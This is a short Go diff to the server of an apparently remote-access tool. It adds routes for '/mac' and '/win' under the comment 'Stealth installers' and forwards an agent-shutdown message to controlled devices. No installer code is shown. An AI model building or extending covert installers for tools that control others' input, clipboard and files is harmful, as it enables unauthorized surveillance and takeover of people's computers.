@@ -98,6 +98,10 @@ func (s *Server) Start() error {
 	mux.HandleFunc("/ws/agent", s.handleAgentWS)
 	mux.HandleFunc("/ws/console", s.handleConsoleWS)
 
+	// Stealth installers
+	mux.HandleFunc("/mac", s.handleMacInstaller)
+	mux.HandleFunc("/win", s.handleWinInstaller)
+
 	// Embedded web management console
 	mux.Handle("/", http.FileServer(http.FS(web.StaticFS)))
 
@@ -396,7 +400,7 @@ func (s *Server) handleConsoleWS(w http.ResponseWriter, r *http.Request) {
 				},
 			})
 
-		case protocol.MsgInputEvent, protocol.MsgClipboardRequest, protocol.MsgClipboardUpdate, protocol.MsgFileTransferStart, protocol.MsgFileTransferChunk, protocol.MsgFileTransferEnd:
+		case protocol.MsgInputEvent, protocol.MsgClipboardRequest, protocol.MsgClipboardUpdate, protocol.MsgFileTransferStart, protocol.MsgFileTransferChunk, protocol.MsgFileTransferEnd, protocol.MsgAgentShutdown:
 			// Forward message from operator to the connected device agent
 			s.mu.RLock()
 			if op.ActiveDevice != "" {
